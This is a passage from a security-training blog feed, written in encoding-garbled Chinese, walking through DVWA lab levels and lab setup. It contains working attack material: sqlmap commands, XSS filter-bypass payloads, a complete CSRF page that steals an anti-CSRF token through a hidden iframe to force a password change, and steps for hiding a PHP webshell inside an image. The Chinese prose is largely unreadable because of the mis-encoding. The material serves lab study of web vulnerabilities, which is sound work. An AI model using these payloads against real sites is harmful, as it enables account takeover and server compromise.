src="https://img-blog.csdnimg.cn/20210207114247547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210207114026134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>æ–¹æ³•äºŒï¼š<br>00æˆªæ–­å‚è€ƒ<a href="https://blog.csdn.net/qq_36119192/article/details/82904642?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161266854316780261920310%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161266854316780261920310&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82904642.first_rank_v2_pc_rank_v29&utm_term=dvwa%20upload">è°¢å…¬å­çš„åšå®¢</a></p><p>ä¸Šä¼ å®Œä¸€å¥è¯å èšå‰‘è¿æ¥</p><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>æ¢ä¸€ä¸ªå·¥å…· è¶…çº§sqlæ³¨å…¥(é€‰æ‹©åˆé€‚çš„å·¥å…· ç†Ÿæ‚‰sqlæ³¨å…¥åŸç†å æ³¨æ„æ—¶æ•ˆæ€§ å¹¶ä¸”æŒæ¡æ³¨å…¥å·¥å…·çš„æœºåˆ¶)<br>burpæŠ“åŒ… æ•´ä¸ªåŒ…æ”¾è¿›æ³¨å…¥ä¸­å¿ƒ<br><img src="https://img-blog.csdnimg.cn/20210207164641599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>ç‚¹å‡»è‡ªåŠ¨è¯†åˆ«åè§‚å¯Ÿä¸‹é¢æ¡†å†…çš„ç¨‹åºè¿è¡ŒçŠ¶æ€<br>æ³¨å…¥å®Œåæ•°æ®ä¸­å¿ƒå¡«å…¥æŸ¥è¯¢æ¡æ•°ä»¥åŠæŸ¥å‡ºæ•°æ®åº“ è¡¨ åˆ—</p><p><strong>å›åˆ°sqlmap(yyds)</strong><br>ç”±äºmediumçš„sqlæ³¨å…¥å‡ä¸ºpostæ³¨å…¥ï¼ˆgetæ³¨å…¥åœ¨urlæœ‰?id=1ï¼‰<br>ä¸€èˆ¬åœ°ï¼Œpostæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¾—æ¢ä¸ªå§¿åŠ¿ï¼š</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong><br>burpæŠ“åŒ…ï¼Œå³å‡»copy fileä¸ºpost.txtä¿å­˜è‡³sqlmap.pyåŒä¸€æ–‡ä»¶å¤¹å†…<br>ä½¿ç”¨-rå‚æ•°ï¼š<code>python3 sqlmap.py -r &quot;post.txt&quot; --batch</code>åé¢ä¸å‰é¢çš„sqlmapä½¿ç”¨æ— å¼‚<img src="https://img-blog.csdnimg.cn/20210210001416332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>ç‰¹æ®Šæƒ…å†µéœ€è¦æ‰‹åŠ¨æŒ‡å®šå‚æ•°<a href="https://blog.csdn.net/u014549283/article/details/81290015?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">ä¼ é€é—¨</a><br><strong>æ–¹æ³•äºŒï¼š</strong><br>è®©sqlmapè‡ªå·±æ‰¾æ³¨å…¥å£ï¼š<br>ä½¿ç”¨:<code>python3 sqlmap.py -u &quot;url&quot; --form</code><br>åé¢æ›´æ¢å‚æ•°ä¸å‰é¢ç”¨æ³•æ— å¼‚<br><code>python3 sqlmap.py -u &quot;url&quot; --form --current-db --batch</code>ï¼ˆåŠ â€“batchå‚æ•°å¯ä»¥ä¸ç”¨å›ç­”é—®é¢˜ ç³»ç»Ÿé»˜è®¤æ‰§è¡Œï¼‰<br><img src="https://img-blog.csdnimg.cn/20210210001742708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>æ–¹æ³•ä¸‰ï¼š</strong><br>æŒ‡å®šå‚æ•°ï¼š<code>sqlmap -u http://xxx.xxx.com/Login.asp --data &quot;id=1&quot;</code></p><h2 id="SQL-Injection-Blind-1"><a href="#SQL-Injection-Blind-1" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>ä¸ä¸Šæ— å¼‚</p><h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><p><strong>åå°„å‹</strong><br><img src="https://img-blog.csdnimg.cn/20210209183447662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">åŒå†™ç»•è¿‡ï¼š<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code></p><p><strong>å­˜å‚¨å‹</strong><br>åŒä¸Š</p><h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h2 id="Command-Injection-2"><a href="#Command-Injection-2" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>è¿‡æ»¤è§„åˆ™ä¸­ <code>&#39;| &#39;</code>å¤šäº†ä¸€ä¸ªç©ºæ ¼ è¯´æ˜å¯ä»¥é€šè¿‡ | ç»•è¿‡</p><h2 id="CSRF-2"><a href="#CSRF-2" class="headerlink" title="CSRF"></a>CSRF</h2><p>å‚è€ƒä¼—å¤šwpéƒ½æåˆ°ä¸€ä¸ªåŒæºç­–ç•¥ <a href="https://www.cnblogs.com/laixiangran/p/9064769.html">æ¥äº†è§£ä¸€ä¸‹</a><br>æ€»ç»“æ¥è¯´ï¼šåŒæºæ˜¯æŒ‡åŸŸåã€åè®®ã€ç«¯å£ç›¸åŒã€‚å®ƒæ˜¯æµè§ˆå™¨çš„æœ€æ ¸å¿ƒæœ€åŸºæœ¬çš„å®‰å…¨åŠŸèƒ½â€”â€”å®ƒè®¤ä¸ºè‡ªä»»ä½•ç«™ç‚¹è£…è½½çš„ä¿¡èµ–å†…å®¹æ˜¯ä¸å®‰å…¨çš„ã€‚å½“è¢«æµè§ˆå™¨åŠä¿¡åŠç–‘çš„è„šæœ¬è¿è¡Œåœ¨æ²™ç®±æ—¶ï¼Œå®ƒä»¬åº”è¯¥<strong>åªè¢«å…è®¸è®¿é—®æ¥è‡ªåŒä¸€ç«™ç‚¹çš„èµ„æº</strong>ï¼Œè€Œä¸æ˜¯é‚£äº›æ¥è‡ªå…¶å®ƒç«™ç‚¹å¯èƒ½æ€€æœ‰æ¶æ„çš„èµ„æºã€‚<br><img src="https://img-blog.csdnimg.cn/20210307181233902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">äº†è§£åˆ°è¿™é‡Œå³å¯<br>é‚£ä¹ˆçœ‹çœ‹è¿™é¢˜æºç ï¼š<br><img src="https://img-blog.csdnimg.cn/2021030823044384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œhighçº§åˆ«åŠ å…¥äº†<code>Anti-CSRF token</code>æœºåˆ¶ï¼šç”¨æˆ·æ¯ä¸€æ¬¡è®¿é—®ä¿®æ”¹å¯†ç çš„ç½‘é¡µæ—¶ï¼Œéƒ½ä¼šå‘æœåŠ¡å™¨ç´¢è¦ä¸€æ¬¡token(æ˜¯æœåŠ¡å™¨éšæœºç”Ÿæˆçš„ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬çš„ç›®æ ‡)ï¼Œå½“ç”¨æˆ·æäº¤äº†å¯†ç ä¿®æ”¹ï¼Œå°†tokenä¼ å›æœåŠ¡å™¨ï¼Œtokenæ­£ç¡®æ‰èƒ½æ›´æ–°æ•°æ®åº“(æ”¹å¯†)</p><p>æ³¨æ„åˆ°æ˜¯ä»¥getæ–¹å¼è¯·æ±‚çš„ï¼Œtokenå°±ä¼šå‡ºç°åœ¨åœ°å€æ ä¼ å›æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæ€è·¯å°±æ¸…æ™°äº†ï¼šæˆ‘ä»¬è¦å¾—åˆ°tokenï¼Œå°±å¿…é¡»è¦å¸¦æœ‰ç”¨æˆ·çš„cookieå»è®¿é—®ä¿®æ”¹å¯†ç çš„ç½‘é¡µï¼Œç„¶åæˆªå–æœåŠ¡å™¨ä¼ å›çš„tokenï¼Œç„¶åå¸¦ä¸Štokenæ„é€ è·¨ç«™è¯·æ±‚ä¼ªé€ </p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªè¯±ä½¿ç”¨æˆ·ç‚¹å‡»çš„é¡µé¢ï¼Œå…¶ä½œç”¨æ˜¯ï¼šé™é»˜è®¿é—®ç”¨æˆ·ä¿®æ”¹å¯†ç çš„é¡µé¢(å½“ç„¶å¯ä»¥è®¾ç½®404å›æ˜¾)ï¼Œè·å–åˆ°æœåŠ¡å™¨ä¼ å›çš„tokenï¼Œç„¶åå¸¦ä¸Štokenå’Œæ”»å‡»urlå‘æœåŠ¡å™¨å‘é€è¯·æ±‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-comment">//è·å–ç”¨æˆ·çš„tokenï¼Œå¹¶è®¾ç½®ä¸ºè¡¨å•ä¸­çš„tokenï¼Œç„¶åæäº¤ä¿®æ”¹å¯†ç çš„è¡¨å•</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">        </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit();</span><br><span class="javascript">        &#125;</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!--åœ¨è¯¥ç½‘é¡µå†…æ‰“å¼€å¦ä¸€ä¸ªç½‘é¡µ--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span>  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œè¯¥ç½‘é¡µåº”è¯¥æ˜¯éƒ¨ç½²åœ¨è‡ªå·±æ¨å‡ºçš„æœåŠ¡å™¨ä¸Šçš„ï¼Œç”¨æˆ·æ‰€åœ¨ç½‘é¡µæ˜¯<code>http://localhost/DVWA/vulnerabilities/csrf/</code>ï¼Œè‡³æ­¤ï¼Œä¸Šè¿°ä¸ç¬¦åˆåŒæºç­–ç•¥ï¼Œæ•…æ”»å‡»æ€è·¯ä¸æˆç«‹</p><p>é‚£ç©¶ç«Ÿæ€æ ·æ‰èƒ½æ‹¿åˆ°tokenå‘¢ï¼Œé‚£å°±åªèƒ½è®©æœåŠ¡å™¨çˆ†å‡ºtokenï¼Œåˆ©ç”¨xss<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code>çˆ†å‡ºtoken</p><p>ï¼ˆæœªæˆåŠŸï¼‰</p><h2 id="File-Inclusion-2"><a href="#File-Inclusion-2" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><img src="https://img-blog.csdnimg.cn/20210308232241155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">è¿™ä¸ªçº§åˆ«è¦æ±‚pageåé¢å¿…é¡»æ˜¯file*æˆ–è€…include.phpå¦åˆ™å°±æŠ¥é”™<br>åˆ©ç”¨fileåè®®æ‰“å¼€æœ¬åœ°æ–‡ä»¶ï¼Œæœ¬åœ°æ–‡ä»¶å³åœ¨æœåŠ¡å™¨ä¸‹æŒ‚ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œé‚£ä¹ˆåˆ™éœ€è¦å…ˆé…åˆæ–‡ä»¶ä¸Šä¼ ï¼Œç„¶åå†åŒ…å«è¿æ¥èšå‰‘(å¯ä»¥æ–‡ä»¶ä¸Šä¼ äº†ä½•å¿…å†åŒ…å« æ‰‹åŠ¨ç‹—å¤´) å…¶å®ä¸æ˜¯ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´åœ¨highçº§åˆ«ä¸‹å·²ç»ä¸èƒ½å‹å¥½çš„æ”¾*.phpäº†<br>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½æŒ‚è¿›ä¸€å¥è¯å‘¢ çœ‹ä¸‹ä¸€æ¡</p><h2 id="File-Uploadï¼ˆå›¾ç‰‡é©¬ï¼‰"><a href="#File-Uploadï¼ˆå›¾ç‰‡é©¬ï¼‰" class="headerlink" title="File Uploadï¼ˆå›¾ç‰‡é©¬ï¼‰"></a>File Uploadï¼ˆå›¾ç‰‡é©¬ï¼‰</h2><p>å…ˆä»£ç å®¡è®¡ï¼š<br><img src="https://img-blog.csdnimg.cn/20210309160727372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">é¦–å…ˆï¼Œ<code>basename()</code>å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œ<code>strrpos()</code>è·å–æ–‡ä»¶åä¸­æœ€åä¸€ä¸ª<code>.</code>åé¢çš„æ‰€æœ‰å­—ç¬¦ä¸²(ä¹Ÿå°±æ˜¯è·å–åç¼€åçš„æ“ä½œäº†)ï¼Œ<code>substr()</code>è¿”å›æ–‡ä»¶åä¸­çš„åç¼€å(å³strrposæˆªå–åˆ°çš„å†…å®¹) ä»¥æ­¤æœŸæœ›è¿‡æ»¤åç¼€å(jpg jpeg pngé€šè¿‡)ï¼Œç„¶åå†ä½¿ç”¨<code>getimagesize()</code>å‡½æ•°æµ‹å®šè¿™æ˜¯ä¸æ˜¯ä¸€å¼ å›¾ç‰‡</p><blockquote><p>getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚</p></blockquote><p>é‚£ä¹ˆä»¥ä¸Šæ“ä½œåŸºæœ¬ä¸èƒ½ç»•è¿‡ä¸Šä¼ å…¶ä»–ç±»å‹çš„æ–‡ä»¶äº†ï¼Œä¸‹é¢ä»‹ç»å›¾ç‰‡é©¬çš„åˆ¶ä½œï¼š<br>æ–¹æ³•ä¸€ï¼šä¸€ä¸ªå›¾ç‰‡ï¼Œä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨cmdçš„copyæ‹¼æ¥<code>copy 1.jpg/b + xiaoma.php/a attack.jpg</code>/aè¡¨ç¤ºä¸€ä¸ªASCII æ–‡æœ¬æ–‡ä»¶ /bè¡¨ç¤ºä¸€ä¸ªäºŒè¿›ä½æ–‡ä»¶<br>æ–¹æ³•äºŒï¼šç›´æ¥ç”¨è®°äº‹æœ¬çš„æ–¹å¼æ‰“å¼€å›¾ç‰‡ï¼Œå¹¶ä¸”ç›´æ¥åœ¨ä¹±ç æœ€åæ’å…¥ä¸€å¥è¯ä»£ç å³å¯ã€‚</p><h2 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h2 id="SQL-Injection-Blind-2"><a href="#SQL-Injection-Blind-2" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><h2 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS"></a>XSS</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é¶åœºæ­å»ºé—®é¢˜</title>
    <link href="/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/"/>
    <url>/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å¹³å°ï¼šDVWA sqli-labs upload-labs xss-labs xxe-labs ssrf-labs bwapp</p><h1 id="SQLi-LABS"><a href="#SQLi-LABS" class="headerlink" title="SQLi-LABS"></a>SQLi-LABS</h1><p>æ­å»ºå‡ºç°çš„é—®é¢˜ï¼Œç”±äºPHPstudyçš„ç‰ˆæœ¬åŸå› ï¼Œæ­å»ºå‡ºç°é—®é¢˜ï¼Œéœ€è¦æ›´æ”¹æ•°æ®åº“åï¼Œæ›´æ”¹é¢ç§¯å¤§ï¼Œç›´æ¥è™šæ‹Ÿæœºå¼€ä½ç‰ˆæœ¬æ­å»º<br>å­¦é•¿è¯­ï¼šç›´æ¥è§£å‹sqli-labsåˆ°wwwæ ¹ç›®å½•ä¸‹å°±è¡Œäº†å•Š<br>æˆ‘â€¦è¿˜çœŸæ˜¯ï¼Œä¸Šå›¾<br><img src="https://img-blog.csdnimg.cn/2020112408582051.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201124102250936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>æ³¨æ„ï¼šéœ€è¦æ›´æ”¹sqli-labs-master\sql-connectionsä¸‹çš„db-creds.incï¼Œè®¾ç½®ç™»å½•å¯†ç ã€‚</p><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><img src="https://img-blog.csdnimg.cn/20201206145227918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70"><br><code>â… éœ€è¦ä¿®æ”¹å½“å‰phpç‰ˆæœ¬é‡Œçš„php.inié…ç½®æ–‡ä»¶ æ›´æ”¹allow_url_include = off ä¸ºOn ==ï¼ˆåäº†ï¼Œå¤§å†™çš„Oï¼‰== è€Œä¸”è¦é‡å¯phpæœåŠ¡ â…¡ç»‘å®šåŸŸåï¼Œè¿›è¡Œæœ¬åœ°DNSæ›´æ–°ï¼Œç½‘ä¸ŠæŸ¥æ‰¾www.DVWA.comçš„å¯†é’¥</code><br>ç½‘ç«™åˆæ¬¡ç™»å…¥å¯†ç :admin/password</p><h1 id="BWAPP"><a href="#BWAPP" class="headerlink" title="BWAPP"></a>BWAPP</h1><p>è¿›å…¥bwappé‡Œadminï¼Œæ›´æ”¹settingsæ›´æ”¹å¯†ç <br>ç™»å½•ç½‘ç«™åå‡ºç°<code>Connection failed: Unknown database &#39;bWAPP&#39;</code><br>è¿›å…¥localhost/bwap/install.php,ç‚¹å‡»here<br>ç½‘ç«™åˆæ¬¡ç™»å…¥å¯†ç ï¼šbee/bug</p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸è§ç«¯å£åŠå…¶æœåŠ¡</title>
    <link href="/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/"/>
    <url>/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>  0<br>  Reserved<br>  é€šå¸¸ç”¨äºåˆ†ææ“ä½œç³»ç»Ÿã€‚è¿™ä¸€æ–¹æ³•èƒ½å¤Ÿå·¥ä½œæ˜¯å› ä¸ºåœ¨ä¸€äº›ç³»ç»Ÿä¸­â€œ0â€æ˜¯æ— æ•ˆ ï¼Œå½“ä½ è¯•å›¾ä½¿ç”¨é€šå¸¸çš„é—­åˆ è¿æ¥å®ƒæ—¶å°†äº§ç”Ÿä¸åŒçš„ç»“æœã€‚ä¸€ç§å…¸å‹çš„æ‰«æï¼Œä½¿ç”¨IPåœ°å€ä¸º0.0.0.0ï¼Œè®¾ç½®ACKä½å¹¶åœ¨ä»¥å¤ªç½‘å±‚å¹¿æ’­ã€‚<br>  1<br>  tcpmux<br>  è¿™æ˜¾ç¤ºæœ‰äººåœ¨å¯»æ‰¾SGI Irixæœºå™¨ã€‚Irixæ˜¯å®ç°tcpmuxçš„ä¸»è¦æä¾›è€…ï¼Œé»˜è®¤æƒ…å†µä¸‹tcpmuxåœ¨è¿™ç§ç³»ç»Ÿä¸­è¢«æ‰“å¼€ã€‚Irixæœºå™¨åœ¨å‘å¸ƒæ˜¯å«æœ‰å‡ ä¸ªé»˜è®¤çš„æ— å¯†ç çš„å¸æˆ·ï¼Œå¦‚ IPã€GUEST UUCPã€NUUCPã€DEMOS ã€TUTORã€DIAGã€OUTOFBOXç­‰ã€‚è®¸å¤šç®¡ç†å‘˜åœ¨å®‰è£…åå¿˜è®°åˆ é™¤è¿™äº›å¸æˆ·ã€‚å› æ­¤HACKERåœ¨INTERNETä¸Šæœç´¢tcpmuxå¹¶åˆ©ç”¨è¿™äº›å¸æˆ·ã€‚</p><p>  7<br>  Echo<br>  èƒ½çœ‹åˆ°è®¸å¤šäººæœç´¢Fraggleæ”¾å¤§å™¨æ—¶ï¼Œå‘é€åˆ°X.X.X.0å’ŒX.X.X.255çš„ä¿¡æ¯ã€‚</p><p>  19<br>  Character Generator<br>  è¿™æ˜¯ä¸€ç§ä»…ä»…å‘é€å­—ç¬¦çš„ ã€‚UDPç‰ˆæœ¬å°†ä¼šåœ¨æ”¶åˆ°UDPåŒ…åå›åº”å«æœ‰åƒåœ¾å­—ç¬¦çš„åŒ…ã€‚TCPè¿æ¥æ—¶ä¼šå‘é€å«æœ‰åƒåœ¾å­—ç¬¦çš„æ•°æ®æµç›´åˆ°è¿æ¥å…³é—­ã€‚HACKERåˆ©ç”¨IPæ¬ºéª—å¯ä»¥å‘åŠ¨DoSæ”»å‡»ã€‚ä¼ªé€ ä¸¤ä¸ªchargen å™¨ä¹‹é—´çš„UDPåŒ…ã€‚åŒæ ·Fraggle DoSæ”»å‡»å‘ç›®æ ‡åœ°å€çš„è¿™ä¸ª å¹¿æ’­ä¸€ä¸ªå¸¦æœ‰ä¼ªé€ å—å®³è€…IPçš„æ•°æ®åŒ…ï¼Œå—å®³è€…ä¸ºäº†å›åº”è¿™äº›æ•°æ®è€Œè¿‡è½½ã€‚</p><p>  21<br>  FTP<br>  FTP å™¨æ‰€å¼€æ”¾çš„ ï¼Œç”¨äºä¸Šä¼ ã€ä¸‹è½½ã€‚æœ€å¸¸è§çš„æ”»å‡»è€…ç”¨äºå¯»æ‰¾æ‰“å¼€anonymousçš„FTP å™¨çš„æ–¹æ³•ã€‚è¿™äº› å™¨å¸¦æœ‰å¯è¯»å†™çš„ç›®å½•ã€‚æœ¨é©¬Doly Trojanã€Foreã€Invisible FTPã€WebExã€WinCrashå’ŒBlade Runneræ‰€å¼€æ”¾çš„ ã€‚</p><p>  22<br>  Ssh<br>  PcAnywhereå»ºç«‹çš„TCPå’Œè¿™ä¸€ çš„è¿æ¥å¯èƒ½æ˜¯ä¸ºäº†å¯»æ‰¾sshã€‚è¿™ä¸€ æœ‰è®¸å¤šå¼±ç‚¹ï¼Œå¦‚æœé…ç½®æˆç‰¹å®šçš„æ¨¡å¼ï¼Œè®¸å¤šä½¿ç”¨RSAREFåº“çš„ç‰ˆæœ¬å°±ä¼šæœ‰ä¸å°‘çš„æ¼æ´å­˜åœ¨ã€‚</p><p>  23<br>  